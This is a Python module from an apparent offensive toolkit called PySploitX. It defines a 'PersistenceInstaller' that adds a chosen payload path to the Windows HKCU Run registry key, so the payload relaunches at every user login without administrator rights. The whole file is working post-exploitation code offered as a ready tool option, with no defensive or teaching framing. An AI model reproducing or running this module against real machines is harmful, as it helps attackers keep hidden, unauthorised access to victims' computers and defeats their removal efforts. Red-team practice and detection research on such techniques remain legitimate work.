import os
from core.base_module import BaseModule
from rich.console import Console

class PersistenceInstaller(BaseModule):
    """Establishes persistence on a Windows machine via the Run registry key."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'PAYLOAD_PATH': ['', 'The full path to the payload to execute on startup.'],
            'REG_NAME': ['PySploitX_Payload', 'The name for the registry entry.'],
            'TARGET_HOST': ['localhost', 'Note: This module runs locally. This is for metadata.']
        }

    def run(self, options):
        """
        Executes the persistence installation.
        """
        payload_path = options.get('PAYLOAD_PATH')
        reg_name = options.get('REG_NAME')
        console = Console()

        if os.name != 'nt':
            console.print("[!] This module only works on Windows.", style="bold red")
            return

        if not payload_path or not reg_name:
            console.print("[!] PAYLOAD_PATH and REG_NAME must be set.", style="bold red")
            return

        # Import is here because it's Windows-specific
        import winreg

        console.print(f"[*] Attempting to add persistence for '{payload_path}'...")

        try:
            # HKEY_CURRENT_USER for user-level persistence without needing admin rights
            key = winreg.HKEY_CURRENT_USER
            sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"

            with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, reg_name, 0, winreg.REG_SZ, payload_path)
            
            console.print("[bold green][+] Persistence successfully installed in HKCU Run key.[/bold green]")
            console.print(f"[*] Registry Entry: {reg_name} -> {payload_path}")

        except FileNotFoundError:
            console.print("[!] Registry key not found. This is unexpected on a Windows system.", style="bold red")
        except PermissionError:
            console.print("[!] Permission denied. You may need higher privileges to modify the registry.", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
